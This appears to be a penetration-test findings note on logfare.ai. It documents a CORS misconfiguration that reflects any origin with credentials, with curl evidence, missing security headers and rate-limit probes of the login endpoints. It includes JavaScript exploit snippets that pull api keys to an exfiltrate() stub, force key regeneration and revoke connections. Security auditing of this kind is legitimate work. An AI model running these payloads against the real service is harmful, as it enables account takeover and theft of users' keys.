# Confirmed Holy Shits

- source canon: `holyshit-mode/case-logfare-ai.md`
- bindings: **WSTG-ATHN** · **CWE-287** · **ATT&CK T1111**
- generated: 2026-11-04

## The technique

### 1. CORS Arbitrary Origin + Credentials on `logfare.ai` (CVSS ~9.1) — **CONFIRMED HOLY SHIT**

**Evidence (2026-10-09 verified):**
```
# Arbitrary origin reflected with credentials:
curl -sI "https://logfare.ai/v1/models" -H "Origin: https://evil.com" 2>&1
HTTP/1.1 200 OK
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true

# Null origin:
curl -sI "https://logfare.ai/v1/models" -H "Origin: null" 2>&1
access-control-allow-origin: null
access-control-allow-credentials: true

# Subdomain trick:
curl -sI "https://logfare.ai/v1/models" -H "Origin: https://anything.logfare.ai" 2>&1
access-control-allow-origin: https://anything.logfare.ai
access-control-allow-credentials: true
```

**ALL endpoints reflect arbitrary origins with credentials:**
- `/v1/models`, `/v1/chat/completions`, `/v1/auth/login`, `/v1/auth/register`
- `/v1/me/data`, `/v1/me/profile`, `/v1/me/usage`, `/v1/me/apps`, `/v1/me/connections`
- `/openapi.json`, `/docs`, `/dashboard`, `/connections`, `/connections/revoke`
- `/oauth/authorize`, `/sso/authorize`, `/developer/apps`
- Even 401, 403, 404, 405, 429 responses carry the CORS headers

**Preflight (OPTIONS) also allows arbitrary origins:**
```
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-allow-headers: Content-Type,Authorization
access-control-allow-credentials: true
```

**Security headers MISSING on main host:**
- No `Content-Security-Policy`
- No `Strict-Transport-Security` (HSTS)
- No `X-Frame-Options` (clickjacking possible)
- No `X-Content-Type-Options: nosniff`
- No `Referrer-Policy`
- No `Permissions-Policy`

**Exploit:**
```javascript
// Malicious site reads authenticated Logfare responses
fetch('https://logfare.ai/v1/me/apps', {credentials:'include'})
  .then(r => r.json())
  .then(d => exfiltrate(d.api_key, d.connections))

// Or account takeover:
fetch('https://logfare.ai/v1/auth/regenerate-key', {
  method: 'POST', credentials: 'include'
})

// Or connection revocation:
fetch('https://logfare.ai/connections/revoke', {
  method: 'POST', credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({token_id: 'any'})
})
```

**chat.logfare.ai — CORS RESTRICTED (not vulnerable):**
- Only reflects `access-control-allow-origin: https://chat.logfare.ai`
- `Origin: null` → `access-control-allow-origin: https://chat.logfare.ai` (NOT reflected)
- `Origin: https://evil.com` → `access-control-allow-origin: https://chat.logfare.ai` (NOT reflected)
- SameSite=Lax cookie on `lfc_session` (90-day Max-Age, HttpOnly, Secure)

**Multi-host trap (session-verified 2026-10-09):** the main host reflected ALL origins while the chat subdomain did NOT — two different CORS configs on the same target. Always test both independently.

### 2. Rate Limiting Assessment (2026-10-09 verified)

**Login (`/v1/auth/login`):** 10 rapid sequential requests → all 401 (no 429), then 429 at request 11. Rate limiter is present but kicks in after 10 attempts.

**Register (`/v1/auth/register`):** 429 after burst. Returns `retry-after: 45` header.

**API endpoints (`/v1/chat/completions`, `/v1/models`):** No rate limit observed — 15 rapid requests all returned expected responses (401 for chat without valid key, 200 for /v1/models) with zero 429s.

**Rate Limiter Behavior (2026-10-09):**
- `/v1/auth/login`: 10 requests then 429 (retry-after header present)
- `/v1/auth/register`: 429 after burst (retry-after: 45)
- `/v1/chat/completions`: No rate limit on 15 rapid requests with Bearer token
- `/v1/models`: No rate limit (public endpoint, 15/15 returned 200)

## Family use

- decisive-test shape lives in the source canon
- walls: validation-only · NO-GAIN · documented-class adaptation only
